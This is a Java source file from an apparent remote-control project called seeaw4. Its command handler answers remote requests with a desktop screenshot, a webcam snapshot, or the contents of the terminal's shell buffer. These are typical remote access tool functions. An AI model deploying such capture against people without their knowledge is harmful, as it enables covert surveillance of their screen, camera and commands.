package wang.ismy.seeaw4.client.command;

import wang.ismy.seeaw4.common.command.CommandHandler;
import wang.ismy.seeaw4.common.connection.Connection;
import wang.ismy.seeaw4.common.message.Message;
import wang.ismy.seeaw4.common.message.impl.CommandMessage;
import wang.ismy.seeaw4.common.message.impl.ImgMessage;
import wang.ismy.seeaw4.common.message.impl.TextMessage;
import wang.ismy.seeaw4.terminal.Resolution;
import wang.ismy.seeaw4.terminal.Terminal;
import wang.ismy.seeaw4.terminal.enums.ImgType;

/**
 * @author MY
 * @date 2019/12/17 16:44
 */
public class ClientCommandHandler implements CommandHandler {

    private Terminal terminal;

    public ClientCommandHandler(Terminal terminal) {
        this.terminal = terminal;
    }

    @Override
    public Message process(Connection connection, CommandMessage commandMessage) {
        switch (commandMessage.getCommand()){
            case SCREEN:
                return screen(connection,commandMessage);
            case PHOTO:
                return photo(connection,commandMessage);
            case SHELL_BUFFER:
                return shellBuffer(connection, commandMessage);
            default:
                return null;
        }
    }

    private Message screen(Connection connection,CommandMessage message){
        byte[] screen = terminal.getDesktop().getScreen(ImgType.JPEG, Resolution.getDefault());
        return new ImgMessage(screen,ImgType.JPEG.getFormat());
    }

    private Message photo(Connection connection,CommandMessage message){
        byte[] screen = terminal.getCamera().getCameraSnapshot(ImgType.JPEG, new Resolution(640,480));
        return new ImgMessage(screen,ImgType.JPEG.getFormat());
    }

    private Message shellBuffer(Connection connection,CommandMessage message){

        return new TextMessage(terminal.getTerminalBuffer());
    }
}
